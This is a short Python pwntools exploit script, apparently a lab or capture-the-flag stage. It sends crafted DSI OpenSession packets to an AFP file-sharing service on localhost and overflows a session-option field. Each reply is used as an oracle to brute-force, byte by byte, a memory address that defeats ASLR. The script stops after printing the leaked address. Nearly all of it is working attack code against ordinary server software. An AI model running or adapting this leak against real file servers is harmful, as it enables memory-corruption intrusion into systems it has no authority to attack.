#!/usr/bin/env python3
from pwn import *

context(arch="amd64", os="linux", endian="little", log_level="debug")


def gen_dsi(data):
    dsi_header = b""
    dsi_header += b"\x00"  # "request" flag
    dsi_header += b"\x04"  # open session command
    dsi_header += b"\x00\x01"  # request id
    dsi_header += p32(0)  # data offset
    dsi_header += p32(len(data), endian="big")
    dsi_header += p32(0)  # reserved
    dsi_header += data
    return dsi_header


leak_addr = b""
while len(leak_addr) < 6:
    for i in range(255, -1, -1):
        io = remote("127.0.0.1", "5566")
        payload = (
            b"\x01" + p8(0x10 + len(leak_addr) + 1) + b"a" * 0x10 + leak_addr + p8(i)
        )
        io.send(gen_dsi(payload))
        try:
            a = io.recv()
            leak_addr += p8(i)
            log.success("Find! {}".format(hex(i)))
            io.close()
            break
        except:
            io.close()

leak_addr = u64(leak_addr.ljust(8, b"\x00")) & 0xFFFFFF000000
log.success("################## Leak: " + hex(leak_addr) + " ##################")
